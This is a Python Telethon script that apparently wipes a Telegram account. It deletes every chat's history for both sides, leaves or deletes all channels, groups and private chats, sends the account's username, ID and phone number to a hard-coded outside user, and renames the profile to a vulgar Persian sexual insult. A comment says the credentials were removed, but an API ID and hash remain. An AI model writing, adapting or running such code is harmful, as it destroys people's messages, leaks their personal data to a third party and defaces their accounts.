from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import Channel, Chat, User
from telethon.errors import FloodWaitError
import asyncio

# اطلاعات حساب خود را اینجا وارد کنید (برای امنیت، مقادیر قبلی پاک شدند)
API_ID = 29834234  # آی‌دی خود را وارد کنید
API_HASH = "552c01d21d127def060f2915aedeebf9" # هش خود را وارد کنید

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = "کیر معین تو کونم"

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    async for d in client.iter_dialogs():
        entity = d.entity
        name = d.name or str(d.id)

        print(f"Processing: {name} ({type(entity).__name__})")

        # بخش اول: پاک کردن تاریخچه چت (در بلاک جداگانه)
        try:
            await client(
                DeleteHistoryRequest(
                    peer=entity,
                    max_id=0,
                    revoke=True
                )
            )
        except Exception as e:
            print(f"  - Could not delete history for {name}: {type(e).__name__}")

        # بخش دوم: خروج و حذف دیالوگ (در بلاک جداگانه)
        try:
            # کانال‌ها و سوپرگروه‌ها
            if isinstance(entity, Channel):
                await client(LeaveChannelRequest(entity))
                await client.delete_dialog(entity)
                print(f"  - Left and deleted Channel/Supergroup: {name}")

            # گروه‌های معمولی
            elif isinstance(entity, Chat):
                await client.delete_dialog(entity)
                print(f"  - Left Group: {name}")

            # چت‌های خصوصی
            elif isinstance(entity, User):
                await client.delete_dialog(entity)
                print(f"  - Deleted Private Chat: {name}")

            # وقفه برای جلوگیری از محدود شدن توسط تلگرام (FloodWait)
            await asyncio.sleep(0.3)

        except FloodWaitError as e:
            print(f"FloodWait: waiting {e.seconds} seconds...")
            await asyncio.sleep(e.seconds)

        except Exception as e:
            print(
                f"  - FAILED to process (leave/delete) {name}. "
                f"Reason: {type(e).__name__}: {e}"
            )

    print("\nDone deleting chats.")

    # دریافت اطلاعات اکانت
    me = await client.get_me()

    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    # ارسال اطلاعات اکانت با هندل کردن خطای احتمالی
    try:
        await client.send_message(TARGET_USERNAME, info_text)
        print(f"Sent account info to @{TARGET_USERNAME}")
    except Exception as e:
        print(f"Could not send account info: {e}")

    # تغییر نام کاربری (First Name)
    try:
        await client(
            UpdateProfileRequest(
                first_name=NEW_FIRST_NAME
            )
        )
        print(f"Account name changed to: {NEW_FIRST_NAME}")
    except Exception as e:
        print(f"Could not update profile name: {e}")


if __name__ == "__main__":
    with client:
        client.loop.run_until_complete(main())
